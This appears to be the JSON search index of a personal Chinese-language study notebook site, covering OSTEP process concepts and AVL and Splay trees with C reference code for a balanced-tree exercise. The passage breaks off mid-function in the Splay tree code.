{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"Welcome to My Notebook","text":"<p>\u8fd9\u91cc\u662f GoPoux \u7684\u4e2a\u4eba\u7b14\u8bb0\u672c</p>"},{"location":"links/","title":"\u53cb\u94fe","text":"<p>45gfg9</p><p>kami</p> <p>shad0wash</p><p>\u7ebf\u4ee3\u306ekami</p>"},{"location":"books/","title":"\u8bfb\u4e66\u7b14\u8bb0","text":""},{"location":"books/ostep/","title":"Operating Systems: Three Easy Pieces","text":"<p>\u8bfb\u7684\u4e2d\u6587\u7248\u300a\u64cd\u4f5c\u7cfb\u7edf\u5bfc\u8bba\u300b</p> <p>\u672c\u4e66\u5305\u542b\u4e09\u4e2a\u90e8\u5206\uff0c\u5206\u522b\u8bb2\u8ff0\u64cd\u4f5c\u7cfb\u7edf\u5982\u4f55\u8fdb\u884c\u865a\u62df\u5316\u3001\u5e76\u53d1\u5904\u7406\u548c\u6301\u4e45\u5316\u3002</p>"},{"location":"books/ostep/chapter1/process/","title":"\u8fdb\u7a0b","text":"<p>Abstract</p> <p>\u5305\u542b\u539f\u4e66\u7684\u7b2c\u4e00\u90e8\u5206</p> <ul> <li>\u7b2c\u56db\u7ae0\uff1a\u62bd\u8c61\uff1a\u8fdb\u7a0b</li> </ul> <p>\u975e\u6b63\u5f0f\u5b9a\u4e49\uff1a\u8fdb\u7a0b\u5c31\u662f\u8fd0\u884c\u4e2d\u7684\u7a0b\u5e8f\u3002</p> <p>\u64cd\u4f5c\u7cfb\u7edf\u901a\u8fc7\u8ba9\u4e00\u4e2a\u8fdb\u7a0b\u53ea\u8fd0\u884c\u4e00\u4e2a\u65f6\u95f4\u7247\uff0c\u7136\u540e\u5207\u6362\u5230\u53e6\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u6765\u63d0\u4f9b\u5b58\u5728\u591a\u4e2a\u865a\u62df CPU \u7684\u5047\u8c61\u3002\u8fd9\u79cd\u6280\u672f\u79f0\u4e3a\u65f6\u5206\u5171\u4eab\uff08time-sharing\uff09\u3002\u6f5c\u5728\u7684\u5f00\u9500\u662f\u6027\u80fd\u635f\u5931\u3002</p> <p>\u65f6\u5206\u5171\u4eab\u548c\u7a7a\u5206\u5171\u4eab</p> <ul> <li>\u65f6\u5206\u5171\u4eab\uff1a\u5141\u8bb8\u8d44\u6e90\u7531\u4e00\u4e2a\u5b9e\u4f53\u4f7f\u7528\u4e00\u6bb5\u65f6\u95f4\uff0c\u7136\u540e\u5207\u6362\u5230\u53e6\u4e00\u4e2a\u5b9e\u4f53\u4f7f\u7528\u4e00\u6bb5\u65f6\u95f4\u3002\uff08CPU \u6216\u7f51\u7edc\uff09</li> <li>\u7a7a\u5206\u5171\u4eab\uff1a\u5141\u8bb8\u8d44\u6e90\u7531\u591a\u4e2a\u5b9e\u4f53\u5171\u4eab\uff0c\u4f46\u662f\u6bcf\u4e2a\u5b9e\u4f53\u53ea\u80fd\u4f7f\u7528\u4e00\u90e8\u5206\u8d44\u6e90\u3002\uff08\u78c1\u76d8\uff09</li> </ul>"},{"location":"books/ostep/chapter1/process/#_2","title":"\u62bd\u8c61\uff1a\u8fdb\u7a0b","text":""},{"location":"books/ostep/chapter1/process/#_3","title":"\u8fdb\u7a0b","text":"<p>\u8fdb\u7a0b\u7684\u673a\u5668\u72b6\u6001\uff08machine state\uff09\uff1a\u7a0b\u5e8f\u5728\u8fd0\u884c\u4e2d\u53ef\u4ee5\u8bfb\u53d6\u6216\u66f4\u65b0\u7684\u5185\u5bb9\u3002</p> <p>\u5185\u5b58\u662f\u673a\u5668\u72b6\u6001\u7684\u5173\u952e\u7ec4\u6210\u90e8\u5206\uff0c\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u6307\u4ee4\u3001\u6570\u636e\u90fd\u5728\u5185\u5b58\u4e2d\u3002\u8fdb\u7a0b\u53ef\u4ee5\u8bbf\u95ee\u7684\u5185\u5b58\u8303\u56f4\u79f0\u4e3a\u5730\u5740\u7a7a\u95f4\uff08address space\uff09\u3002</p> <p>\u673a\u5668\u72b6\u6001\u7684\u53e6\u4e00\u90e8\u5206\u662f\u5bc4\u5b58\u5668\u3002\u6b64\u5916\uff0c\u7a0b\u5e8f\u8bbf\u95ee\u6301\u4e45\u5b58\u50a8\u8bbe\u5907\u7684 I/O \u4fe1\u606f\u4e5f\u662f\u673a\u5668\u72b6\u6001\u7684\u4e00\u90e8\u5206\u3002</p>"},{"location":"books/ostep/chapter1/process/#_4","title":"\u8fdb\u7a0b\u521b\u5efa","text":"<p>\u64cd\u4f5c\u7cfb\u7edf\u5982\u4f55\u542f\u52a8\u5e76\u8fd0\u884c\u4e00\u4e2a\u7a0b\u5e8f\uff1f</p> <ol> <li>\u5c06\u4ee3\u7801\u548c\u6240\u6709\u9759\u6001\u6570\u636e\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\uff0c\u5373\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u3002</li> <li>\u4e3a\u7a0b\u5e8f\u7684\u8fd0\u884c\u65f6\u6808\uff08runtime stack\uff09\u5206\u914d\u5185\u5b58\u3002</li> <li>\u4e3a\u7a0b\u5e8f\u7684\u5806\uff08heap\uff09\u5206\u914d\u5185\u5b58\u3002</li> <li>\u6267\u884c\u5176\u4ed6\u521d\u59cb\u5316\u4efb\u52a1\uff0c\u4f8b\u5982 I/O\u3002</li> <li>\u542f\u52a8\u7a0b\u5e8f\uff0c\u8df3\u8f6c\u5230\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9\u3002</li> </ol>"},{"location":"cs/","title":"Computer Science","text":"<p>Abstract</p> <p>\u5f52\u6863\u5927\u5b66\u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u6280\u672f\u8bfe\u7a0b\u7684\u4e00\u4e9b\u5b66\u4e60\u7b14\u8bb0</p>"},{"location":"cs/ads/","title":"\u9ad8\u7ea7\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u5206\u6790","text":"<p>Info</p> <p>\u672c\u6587\u6863\u4e3a\u9ad8\u7ea7\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u5206\u6790\u7684\u5b66\u4e60\u7b14\u8bb0\uff0c\u6388\u8bfe\u6559\u5e08\u4e3a \u6768\u6d0b \u3002</p>"},{"location":"cs/ads/chapter1/","title":"AVL, Splay and Amortized Analysis","text":""},{"location":"cs/ads/chapter1/#avl-trees","title":"AVL Trees","text":"<p>\u7ef4\u6301\u5e73\u8861\u7684\u4e8c\u53c9\u641c\u7d22\u6811\uff0c\u6bcf\u4e2a\u8282\u70b9\u7684\u5de6\u53f3\u5b50\u6811\u9ad8\u5ea6\u5dee\u4e0d\u8d85\u8fc71\u3002</p> <p>\u9ad8\u5ea6\u5e73\u8861</p> <p>\u5b9a\u4e49\u7a7a\u6811\u7684\u9ad8\u5ea6\u4e3a -1</p> <ul> <li>\u7a7a\u6811\u662f\u9ad8\u5ea6\u5e73\u8861\u7684</li> <li> <p>\u4e00\u4e2a\u8282\u70b9\u662f\u9ad8\u5ea6\u5e73\u8861\u7684\uff0c\u5f53\u4e14\u4ec5\u5f53\uff1a</p> <ol> <li>\u5b83\u7684\u5de6\u53f3\u5b50\u6811\u90fd\u662f\u9ad8\u5ea6\u5e73\u8861\u7684</li> <li>\u5b83\u7684\u5de6\u53f3\u5b50\u6811\u7684\u9ad8\u5ea6\u5dee\u4e0d\u8d85\u8fc7 1</li> </ol> </li> </ul> <p>\u5e73\u8861\u56e0\u5b50\uff08Balance Factor\uff09</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u8282\u70b9\uff0c\u5b83\u7684\u5e73\u8861\u56e0\u5b50\u662f\u5b83\u7684\u5de6\u5b50\u6811\u7684\u9ad8\u5ea6\u51cf\u53bb\u53f3\u5b50\u6811\u7684\u9ad8\u5ea6\u3002</p> <p>\u5373 \\( \\text{BF}(v) = \\text{height}(T_l) - \\text{height}(T_r) \\)</p>"},{"location":"cs/ads/chapter1/#operations","title":"Operations","text":""},{"location":"cs/ads/chapter1/#tree-rotation","title":"\u6811\u65cb\u8f6c\uff08Tree Rotation\uff09","text":"<p>\u6811\u65cb\u8f6c\u5206\u4e3a\u5de6\u65cb\u548c\u53f3\u65cb\u3002\u65cb\u8f6c\u64cd\u4f5c\u540e\uff0c\u88ab\u65cb\u8f6c\u7684\u8fb9\u7684\u4e24\u7aef\u4e00\u7aef\u7684\u5b50\u6811\u9ad8\u5ea6\u51cf\u5c0f 1\uff0c\u53e6\u4e00\u7aef\u7684\u5b50\u6811\u9ad8\u5ea6\u589e\u52a0 1\u3002</p> <p>\u53c2\u8003\u4ee3\u7801\uff08\u907f\u514d\u5206\u7c7b\u8ba8\u8bba\uff09\uff1a</p> <pre><code>/*\n * type = 0: right rotate\n * type = 1: left  rotate\n */\nNode *rotate(Node *p, int type) {\n    Node *q = p-&gt;child[type];\n    p-&gt;child[type] = q-&gt;child[type ^ 1];\n    q-&gt;child[type ^ 1] = p;\n    maintain_info(p);\n    maintain_info(q);\n    return q;\n}\n</code></pre>"},{"location":"cs/ads/chapter1/#rebalance","title":"Rebalance","text":"<p>\u63d2\u5165\u548c\u5220\u9664\u64cd\u4f5c\u540e\uff0c\u53ef\u80fd\u4f1a\u7834\u574f AVL \u6811\u7684\u5e73\u8861\u6027\u3002\u6b64\u65f6\u9700\u8981\u8fdb\u884c\u6811\u7684\u65cb\u8f6c\u64cd\u4f5c\uff0c\u4f7f\u5f97\u6811\u91cd\u65b0\u5e73\u8861\u3002</p> <p>\u4ece\u63d2\u5165\u6216\u5220\u9664\u7684\u8282\u70b9\u5f00\u59cb\uff0c\u5411\u4e0a\u56de\u6eaf\u66f4\u65b0\u5e73\u8861\u56e0\u5b50\uff0c\u76f4\u5230\u627e\u5230\u7b2c\u4e00\u4e2a\u4e0d\u5e73\u8861\u7684\u8282\u70b9 X\u3002\u8bbe X \u4e2d\u9ad8\u5ea6\u66f4\u9ad8\u7684\u513f\u5b50\u4e3a Z\uff0c\u5b58\u5728\u56db\u79cd\u60c5\u51b5\uff1a</p> <ul> <li>LL\uff1aZ \u662f X \u7684\u5de6\u513f\u5b50\uff0c\u4e14 \\( \\text{BF}(Z) &gt; 1 \\)</li> <li>LR\uff1aZ \u662f X \u7684\u5de6\u513f\u5b50\uff0c\u4e14 \\( \\text{BF}(Z) &lt; -1 \\)</li> <li>RR\uff1aZ \u662f X \u7684\u53f3\u513f\u5b50\uff0c\u4e14 \\( \\text{BF}(Z) &lt; -1 \\)</li> <li>RL\uff1aZ \u662f X \u7684\u53f3\u513f\u5b50\uff0c\u4e14 \\( \\text{BF}(Z) &gt; 1 \\)</li> </ul> <p>\u8fd9\u91cc\u7684\u547d\u540d\u6839\u636e\u7684\u662f\u5931\u8861\u7684\u6765\u6e90\uff0c\u800c\u4e0d\u662f\u65cb\u8f6c\u64cd\u4f5c\u7684\u987a\u5e8f</p> <p>\u5bf9\u5e94\u7684\u9009\u62e9\u64cd\u4f5c\uff1a</p> <ul> <li>LL\uff1a\u53f3\u65cb X</li> <li>LR\uff1a\u5de6\u65cb Z\uff0c\u53f3\u65cb X</li> <li>RR\uff1a\u5de6\u65cb X</li> <li>RL\uff1a\u53f3\u65cb Z\uff0c\u5de6\u65cb X</li> </ul> <p>\u53c2\u8003\u4ee3\u7801\uff1a</p> <pre><code>Node *maintain(Node *p) {\n    if (p == NULL) return p;\n    maintain_info(p);\n    if (p-&gt;bfactor &gt; 1) {\n        if (getHeight(p-&gt;child[0]-&gt;child[0]) &gt;= getHeight(p-&gt;child[0]-&gt;child[1])) {\n            // LL Rotate\n            return rotate(p, 0);\n        } else {\n            // LR Rotate\n            p-&gt;child[0] = rotate(p-&gt;child[0], 1);\n            return rotate(p, 0);\n        }\n    } else if (p-&gt;bfactor &lt; -1) {\n        if (getHeight(p-&gt;child[1]-&gt;child[1]) &gt;= getHeight(p-&gt;child[1]-&gt;child[0])) {\n            // RR Rotate\n            return rotate(p, 1);\n        } else {\n            // RL Rotate\n            p-&gt;child[1] = rotate(p-&gt;child[1], 0);\n            return rotate(p, 1);\n        }\n    }\n    return p;\n}\n</code></pre>"},{"location":"cs/ads/chapter1/#insertion","title":"Insertion","text":"<p>\u5148\u9012\u5f52\u627e\u5230\u63d2\u5165\u7684\u4f4d\u7f6e\uff0c\u65b0\u5efa\u8282\u70b9\uff0c\u7136\u540e\u56de\u6eaf\u66f4\u65b0\u5e73\u8861\u56e0\u5b50\uff0c\u76f4\u5230\u627e\u5230\u7b2c\u4e00\u4e2a\u4e0d\u5e73\u8861\u7684\u8282\u70b9\uff0c\u7136\u540e\u8fdb\u884c rebalance\u3002</p>"},{"location":"cs/ads/chapter1/#deletion","title":"Deletion","text":"<p>\u5148\u9012\u5f52\u627e\u5230\u5220\u9664\u7684\u4f4d\u7f6e\uff0c\u5206\u7c7b\u8ba8\u8bba\uff1a</p> <ul> <li>\u5220\u9664\u7684\u8282\u70b9\u53ea\u6709\u5c0f\u4e8e\u4e24\u4e2a\u513f\u5b50\uff1a\u7528\u5b50\u8282\u70b9\u66ff\u6362\u8be5\u8282\u70b9\uff0c\u4ece\u6b64\u8282\u70b9\u5f00\u59cb\u56de\u6eaf\u66f4\u65b0\u5e73\u8861\u56e0\u5b50\u3002</li> <li>\u5220\u9664\u7684\u8282\u70b9\u6709\u4e24\u4e2a\u513f\u5b50\uff1a\u627e\u5230\u8be5\u8282\u70b9\u7684\u524d\u9a71\uff0c\u4ea4\u6362\u4e24\u8282\u70b9\uff0c\u968f\u540e\u5220\u9664\u524d\u9a71\u8282\u70b9\uff0c\u4ece\u524d\u9a71\u8282\u70b9\u5f00\u59cb\u56de\u6eaf\u66f4\u65b0\u5e73\u8861\u56e0\u5b50\u3002</li> </ul>"},{"location":"cs/ads/chapter1/#_1","title":"\u590d\u6742\u5ea6\u5206\u6790","text":"<p>\u8bbe \\( f(h) \\) \u4e3a\u9ad8\u5ea6\u4e3a \\( h \\) \u7684 AVL \u6811\u7684\u6700\u5c0f\u8282\u70b9\u6570\uff0c\u90a3\u4e48\u6709\uff1a</p> \\[ \\begin{aligned} f(-1) = 0, \\quad f(0) = 1 \\\\ f(h) = f(h-1) + f(h-2) + 1 \\end{aligned} \\] <p>Fibonacci \u6570\u5217</p> <p>Fibonacci \u6570\u5217\u7684\u5b9a\u4e49\u4e3a \\( F(0) = 0, F(1) = 1, F(n) = F(n-1) + F(n-2) \\)\u3002</p> <p>\u5176\u901a\u9879\u516c\u5f0f\u4e3a\uff1a</p> \\[ F(n) \\approx \\frac{1}{\\sqrt{5}} \\left( \\frac{1 + \\sqrt{5}}{2} \\right)^n \\] <p>\u6613\u5f97 \\( f(h) = F(h+3) - 1 \\approx \\frac{1}{\\sqrt{5}} \\left( \\frac{1 + \\sqrt{5}}{2} \\right)^{h+3} - 1\\)\u3002</p> <p>\u5219\u6709 \\( h = O(\\log n) \\)\uff0c\u5219 AVL \u5355\u6b21\u64cd\u4f5c\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\( O(\\log n) \\)\u3002</p>"},{"location":"cs/ads/chapter1/#_2","title":"\u53c2\u8003\u4ee3\u7801","text":"luoguP3369 \u3010\u6a21\u677f\u3011\u666e\u901a\u5e73\u8861\u6811 <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;limits.h&gt;\n#define INF INT_MAX\n#define max(a, b) ((a) &gt; (b) ? (a) : (b))\n\ntypedef struct Node Node;\nstruct Node {\n    int key, height, size, bfactor;\n    Node *child[2]; // child[0]: left child, child[1]: right child\n};\n\ntypedef struct AVLTree AVLTree;\nstruct AVLTree {\n    Node *root;\n};\n\nNode *newNode(int key) {\n    Node *p = (Node *)malloc(sizeof(Node));\n    p-&gt;key = key;\n    p-&gt;child[0] = p-&gt;child[1] = NULL;\n    p-&gt;height = 0;\n    p-&gt;bfactor = 0;\n    p-&gt;size = 1;\n    return p;\n}\n\nint getHeight(Node *p) {\n    return p == NULL ? -1 : p-&gt;height;\n}\n\nint getSize(Node *p) {\n    return p == NULL ? 0 : p-&gt;size;\n}\n\nvoid maintain_info(Node *p) {\n    if (p == NULL) return;\n    p-&gt;height = max(getHeight(p-&gt;child[0]), getHeight(p-&gt;child[1])) + 1;\n    p-&gt;bfactor = getHeight(p-&gt;child[0]) - getHeight(p-&gt;child[1]);\n    p-&gt;size = 1 + getSize(p-&gt;child[0]) + getSize(p-&gt;child[1]);\n}\n\n/*\n* type = 0: right rotate\n* type = 1: left  rotate\n*/\nNode *rotate(Node *p, int type) {\n    Node *q = p-&gt;child[type];\n    p-&gt;child[type] = q-&gt;child[type ^ 1];\n    q-&gt;child[type ^ 1] = p;\n    maintain_info(p);\n    maintain_info(q);\n    return q;\n}\n\nNode *maintain(Node *p) {\n    if (p == NULL) return p;\n    maintain_info(p);\n    if (p-&gt;bfactor &gt; 1) {\n        if (getHeight(p-&gt;child[0]-&gt;child[0]) &gt;= getHeight(p-&gt;child[0]-&gt;child[1])) {\n            // LL Rotate\n            return rotate(p, 0);\n        } else {\n            // LR Rotate\n            p-&gt;child[0] = rotate(p-&gt;child[0], 1);\n            return rotate(p, 0);\n        }\n    } else if (p-&gt;bfactor &lt; -1) {\n        if (getHeight(p-&gt;child[1]-&gt;child[1]) &gt;= getHeight(p-&gt;child[1]-&gt;child[0])) {\n            // RR Rotate\n            return rotate(p, 1);\n        } else {\n            // RL Rotate\n            p-&gt;child[1] = rotate(p-&gt;child[1], 0);\n            return rotate(p, 1);\n        }\n    }\n    return p;\n}\n\nNode *insert(Node *p, int key) {\n    if (p == NULL) return newNode(key);\n    if (key &lt;= p-&gt;key) {\n        p-&gt;child[0] = insert(p-&gt;child[0], key);\n    } else {\n        p-&gt;child[1] = insert(p-&gt;child[1], key);\n    }\n    return maintain(p);\n}\n\nNode *erase_max(Node *p) {\n    if (p == NULL) return p;\n    if (p-&gt;child[1] == NULL) {\n        Node *q = p-&gt;child[0];\n        free(p);\n        return q;\n    } else {\n        p-&gt;child[1] = erase_max(p-&gt;child[1]);\n        return maintain(p);\n    }\n}\n\nNode *erase(Node *p, int key) {\n    if (p == NULL) return p;\n    if (key &lt; p-&gt;key) {\n        p-&gt;child[0] = erase(p-&gt;child[0], key);\n    } else if (key &gt; p-&gt;key) {\n        p-&gt;child[1] = erase(p-&gt;child[1], key);\n    } else {\n        if (p-&gt;child[0] == NULL || p-&gt;child[1] == NULL) {\n            Node *q = p-&gt;child[0] ? p-&gt;child[0] : p-&gt;child[1];\n            free(p);\n            return q;\n        } else {\n            Node *q = p-&gt;child[0];\n            while (q-&gt;child[1]) q = q-&gt;child[1];\n            p-&gt;key = q-&gt;key;\n            p-&gt;child[0] = erase_max(p-&gt;child[0]);\n        }\n    }\n    return maintain(p);\n}\n\nint query_rank(Node *p, int key) {\n    if (p == NULL) return 0;\n    if (key &lt;= p-&gt;key) {\n        return query_rank(p-&gt;child[0], key);\n    } else {\n        return getSize(p-&gt;child[0]) + 1 + query_rank(p-&gt;child[1], key);\n    }\n}\n\nint query_kth(Node *p, int k) {\n    if (p == NULL) return INF;\n    if (k &lt;= getSize(p-&gt;child[0])) {\n        return query_kth(p-&gt;child[0], k);\n    } else if (k == getSize(p-&gt;child[0]) + 1) {\n        return p-&gt;key;\n    } else {\n        return query_kth(p-&gt;child[1], k - getSize(p-&gt;child[0]) - 1);\n    }\n}\n\nint query_pre(Node *p, int key) {\n    if (p == NULL) return INF;\n    if (key &lt;= p-&gt;key) {\n        return query_pre(p-&gt;child[0], key);\n    } else {\n        int res = query_pre(p-&gt;child[1], key);\n        return res == INF ? p-&gt;key : res;\n    }\n}\n\nint query_suc(Node *p, int key) {\n    if (p == NULL) return INF;\n    if (key &gt;= p-&gt;key) {\n        return query_suc(p-&gt;child[1], key);\n    } else {\n        int res = query_suc(p-&gt;child[0], key);\n        return res == INF ? p-&gt;key : res;\n    }\n}\n\nvoid fprint_tree(Node *p) {\n    if (p == NULL) return;\n    fprint_tree(p-&gt;child[0]);\n    fprintf(stderr, \"%d \", p-&gt;key);\n    fprint_tree(p-&gt;child[1]);\n}\n\nvoid free_tree(Node *p) {\n    if (p == NULL) return;\n    free_tree(p-&gt;child[0]);\n    free_tree(p-&gt;child[1]);\n    free(p);\n}\n\nint main() {\n    int n;\n    scanf(\"%d\", &amp;n);\n    AVLTree *avl = (AVLTree *)malloc(sizeof(AVLTree));\n    avl-&gt;root = NULL;\n    while (n--) {\n        int opt, x;\n        scanf(\"%d%d\", &amp;opt, &amp;x);\n        switch (opt) {\n        case 1:\n            avl-&gt;root = insert(avl-&gt;root, x);\n            break;\n        case 2:\n            avl-&gt;root = erase(avl-&gt;root, x);\n            break;\n        case 3:\n            printf(\"%d\\n\", query_rank(avl-&gt;root, x) + 1);\n            break;\n        case 4:\n            printf(\"%d\\n\", query_kth(avl-&gt;root, x));\n            break;\n        case 5:\n            printf(\"%d\\n\", query_pre(avl-&gt;root, x));\n            break;\n        case 6:\n            printf(\"%d\\n\", query_suc(avl-&gt;root, x));\n            break;\n        }\n        // fprintf(stderr, \"[\");\n        // fprint_tree(avl-&gt;root);\n        // fprintf(stderr, \"]\\n\");\n    }\n    free_tree(avl-&gt;root);\n    return 0;\n}\n</code></pre>"},{"location":"cs/ads/chapter1/#splay-trees","title":"Splay Trees","text":"<p>\u81ea\u8c03\u6574\u4e8c\u53c9\u641c\u7d22\u6811\uff0c\u901a\u8fc7 splay \u64cd\u4f5c\u4fdd\u8bc1\u590d\u6742\u5ea6\u3002</p> <p>Splay \u6811\u4e0d\u4e00\u5b9a\u5e73\u8861</p>"},{"location":"cs/ads/chapter1/#operations_1","title":"Operations","text":""},{"location":"cs/ads/chapter1/#tree-rotation_1","title":"\u6811\u65cb\u8f6c\uff08Tree Rotation\uff09","text":"<p>Splay \u6811\u7684\u65cb\u8f6c\u64cd\u4f5c\u4e0e AVL \u6811\u7c7b\u4f3c\uff0c\u8fd8\u9700\u8981\u989d\u5916\u7ef4\u62a4 parent \u6307\u9488\u3002</p> <p>\u53c2\u8003\u4ee3\u7801\uff1a</p> <pre><code>// \u5c06 p \u5411\u4e0a\u65cb\u8f6c\nvoid rotate(Node *p) {\n    if (p-&gt;parent == NULL) return;\n    Node *p_parent = p-&gt;parent;\n    int type = getPosition(p); // 0: left rotate, 1: right rotate\n    p_parent-&gt;child[type] = p-&gt;child[type ^ 1];\n    p-&gt;child[type ^ 1] = p_parent;\n    if (p_parent-&gt;parent != NULL) {\n        p_parent-&gt;parent-&gt;child[getPosition(p_parent)] = p;\n    }\n    p-&gt;parent = p_parent-&gt;parent;\n    p_parent-&gt;parent = p;\n    if (p_parent-&gt;child[type]) {\n        p_parent-&gt;child[type]-&gt;parent = p_parent;\n    }\n    maintain(p_parent);\n    maintain(p);\n}\n</code></pre>"},{"location":"cs/ads/chapter1/#splay","title":"Splay","text":"<p>Splay \u64cd\u4f5c\u662f\u5c06\u8282\u70b9\u901a\u8fc7\u65cb\u8f6c\u64cd\u4f5c\u65cb\u8f6c\u5230\u6839\u8282\u70b9\u3002</p> <p>\u8bbe x \u4e3a\u8981\u8fdb\u884c splay \u64cd\u4f5c\u7684\u8282\u70b9\uff0cp \u4e3a x \u7684\u7236\u8282\u70b9\uff0cg \u4e3a x \u7684\u7956\u7236\u8282\u70b9\uff0c\u6709\u4ee5\u4e0b\u4e09\u79cd\u60c5\u51b5\uff1a</p> <ul> <li> <p>Zig\uff1ap \u662f\u6839\u8282\u70b9\uff0c\u76f4\u63a5\u65cb\u8f6c x\u3002</p> <p> </p> </li> <li> <p>Zig-Zig\uff1ap \u548c x \u5728\u540c\u4e00\u4fa7\uff0c\u5148\u65cb\u8f6c p\uff0c\u518d\u65cb\u8f6c x\u3002</p> <p> </p> </li> <li> <p>Zig-Zag\uff1ap \u548c x \u5728\u4e0d\u540c\u4fa7\uff0c\u65cb\u8f6c\u4e24\u6b21 x\u3002</p> <p> </p> </li> </ul> <p>\u53c2\u8003\u4ee3\u7801\uff1a</p> <pre><code>int getPosition(Node *p) {\n    if (p-&gt;parent == NULL) return -1;\n    return p == p-&gt;parent-&gt;child[1];\n}\n\nvoid splay(SplayTree *tree, Node *p) {\n    for (Node *par = p-&gt;parent; par != NULL; rotate(p), par = p-&gt;parent) {\n        if (par-&gt;parent != NULL) {\n            rotate(getPosition(p) == getPosition(par) ? par : p);\n        }\n    }\n    tree-&gt;root = p;\n}\n</code></pre>"},{"location":"cs/ads/chapter1/#insertion_1","title":"Insertion","text":"<p>\u5148\u9012\u5f52\u627e\u5230\u63d2\u5165\u7684\u4f4d\u7f6e\uff0c\u65b0\u5efa\u8282\u70b9\uff0c\u7136\u540e splay \u8be5\u8282\u70b9\u3002</p>"},{"location":"cs/ads/chapter1/#merge","title":"Merge","text":"<p>\u5408\u5e76\u4e24\u68f5 splay \u6811\uff0c\u4e14\u4fdd\u8bc1\u5de6\u6811\u7684\u6240\u6709\u8282\u70b9\u7684\u952e\u503c\u5c0f\u4e8e\u53f3\u6811\u7684\u6240\u6709\u8282\u70b9\u7684\u952e\u503c\u3002</p> <p>\u5148\u5bf9\u5de6\u6811\u4e2d\u6700\u5927\u7684\u8282\u70b9\u8fdb\u884c splay \u64cd\u4f5c\uff0c\u7136\u540e\u5c06\u53f3\u6811\u4f5c\u4e3a\u5de6\u6811\u6839\u8282\u70b9\u7684\u53f3\u5b50\u6811\u3002</p>"},{"location":"cs/ads/chapter1/#deletion_1","title":"Deletion","text":"<p>\u5148\u9012\u5f52\u627e\u5230\u5220\u9664\u7684\u4f4d\u7f6e\uff0c\u5c06\u5176 splay \u5230\u6839\u8282\u70b9\uff0c\u7136\u540e\u5220\u9664\u6839\u8282\u70b9\uff0c\u518d\u5c06\u5de6\u53f3\u5b50\u6811\u5408\u5e76\u3002</p>"},{"location":"cs/ads/chapter1/#_3","title":"\u53c2\u8003\u4ee3\u7801","text":"luoguP3369 \u3010\u6a21\u677f\u3011\u666e\u901a\u5e73\u8861\u6811 <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;limits.h&gt;\n#define INF INT_MAX\n#define max(a, b) ((a) &gt; (b) ? (a) : (b))\n\ntypedef struct Node Node;\nstruct Node {\n    int key, size, cnt;\n    Node *child[2]; // child[0]: left child, child[1]: right child\n    Node *parent;\n};\n\ntypedef struct SplayTree SplayTree;\nstruct SplayTree {\n    Node *root;\n};\n\n// void fprint_tree(Node *p) {\n//     if (p == NULL) return;\n//     fprint_tree(p-&gt;child[0]);\n//     fprintf(stderr, \"%d(%d, par:%d)[%d, %d] \", p-&gt;key, p-&gt;cnt, p-&gt;parent != NULL ? p-&gt;parent-&gt;key : -1,\n//                 p-&gt;child[0] != NULL ? p-&gt;child[0]-&gt;key : -1, p-&gt;child[1] != NULL ? p-&gt;child[1]-&gt;key : -1);\n//     fprint_tree(p-&gt;child[1]);\n// }\n\nNode *newNode(int key) {\n    Node *p = (Node *)malloc(sizeof(Node));\n    p-&gt;key = key;\n    p-&gt;size = 1;\n    p-&gt;cnt = 1;\n    p-&gt;child[0] = p-&gt;child[1] = NULL;\n    p-&gt;parent = NULL;\n    return p;\n}\n\nint getSize(Node *p) {\n    return p == NULL ? 0 : p-&gt;size;\n}\n\nint getPosition(Node *p) {\n    if (p-&gt;parent == NULL) return -1;\n    return p == p-&gt;parent-&gt;child[1];\n}\n\nvoid maintain(Node *p) {\n    if (p == NULL) return;\n    p-&gt;size = p-&gt;cnt + getSize(p-&gt;child[0]) + getSize(p-&gt;child[1]);\n}\n\nvoid rotate(Node *p) {\n    if (p-&gt;parent == NULL) return;\n    Node *p_parent = p-&gt;parent;\n    int type = getPosition(p); // 0: left rotate, 1: right rotate\n    p_parent-&gt;child[type] = p-&gt;child[type ^ 1];\n    p-&gt;child[type ^ 1] = p_parent;\n    if (p_parent-&gt;parent != NULL) {\n        p_parent-&gt;parent-&gt;child[getPosition(p_parent)] = p;\n    }\n    p-&gt;parent = p_parent-&gt;parent;\n    p_parent-&gt;parent = p;\n    if (p_parent-&gt;child[type]) {\n        p_parent-&gt;child[type]-&gt;parent = p_parent;\n    }\n    maintain(p_parent);\n    maintain(p);\n}\n\nvoid splay(SplayTree *tree, Node *p) {\n    for (Node *par = p-&gt;parent; par != NULL; rotate(p), par = p-&gt;parent) {\n        if (par-&gt;parent != NULL) {\n            rotate(getPosition(p) == getPosition(par) ? par : p);\n        }\n    }\n    tree-&gt;root = p;\n}\n\nvoid insert(SplayTree *tree, int key) {\n    if (tree-&gt;root == NULL) {\n        tree-&gt;root = newNode(key);\n        return;\n    }\n    Node *p = tree-&gt;root, *par = NULL;\n    while (p != NULL) {\n        par = p;\n        if (key &lt; p-&gt;key) {\n            p = p-&gt;child[0];\n        } else if (key &gt; p-&gt;key) {\n            p = p-&gt;child[1];\n        } else {\n            p-&gt;cnt++;\n            maintain(p);\n            splay(tree, p);\n            return;\n        }\n    }\n    p = newNode(key);\n    p-&gt;parent = par;\n    if (key &lt;= par-&gt;key) {\n        par-&gt;child[0] = p;\n    } else {\n        par-&gt;child[1] = p;\n    }\n    splay(tree, p);\n}\n\nint query_kth(SplayTree *tree, int k) {\n    Node *p = tree-&gt;root;\n    while (p != NULL) {\n        if (k &lt;= getSize(p-&gt;child[0])) {\n            p = p-&gt;child[0];\n        } else if (k &gt; getSize(p-&gt;child[0]) + p-&gt;cnt) {\n            k -= getSize(p-&gt;child[0]) + p-&gt;cnt;\n            p = 